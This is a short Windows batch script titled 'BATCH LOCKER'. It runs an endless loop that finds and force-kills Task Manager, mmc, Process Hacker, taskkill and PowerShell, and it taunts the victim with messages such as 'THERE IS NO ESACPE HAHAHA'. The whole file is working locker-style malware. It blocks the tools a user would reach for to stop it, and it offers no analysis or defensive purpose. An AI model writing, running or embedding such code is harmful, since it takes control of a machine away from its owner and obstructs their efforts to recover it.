@echo off
title BATCH LOCKER
echo THERE IS NO ESACPE HAHAHA

:taskkillr
set "kill=none"
tasklist /fi "ImageName eq taskmgr.exe" /fo csv 2>NUL | find /I "taskmgr.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=taskmgr"

tasklist /fi "ImageName eq mmc.exe" /fo csv 2>NUL | find /I "mmc.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=mmc"

tasklist /fi "ImageName eq ProcessHacker.exe" /fo csv 2>NUL | find /I "ProcessHacker.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=PH"

tasklist /fi "ImageName eq taskkill.exe" /fo csv 2>NUL | find /I "taskkill.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=taskkill"

tasklist /fi "ImageName eq powershell.exe" /fo csv 2>NUL | find /I "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=pwsh"


if %kill%==none (
goto taskkillr 
) else (
if %kill%==taskmgr taskkill /f /im taskmgr.exe /t > nul &  echo NO task manager for you :D & goto taskkillr
if %kill%==mmc taskkill /f /im mmc.exe /t > nul & echo NO Management Console for you :D & goto taskkillr
if %kill%==PH taskkill /f /im ProcessHacker.exe /t > nul & echo NO Process Hacker for you :D & goto taskkillr
if %kill%==taskkill taskkill /f /im taskkill.exe /t > nul & echo NO taskkill for you :D & goto taskkillr
if %kill%==pwsh taskkill /f /im powershell.exe /t > nul & echo NO Powershell for you :D & goto taskkillr

)

goto taskkillr
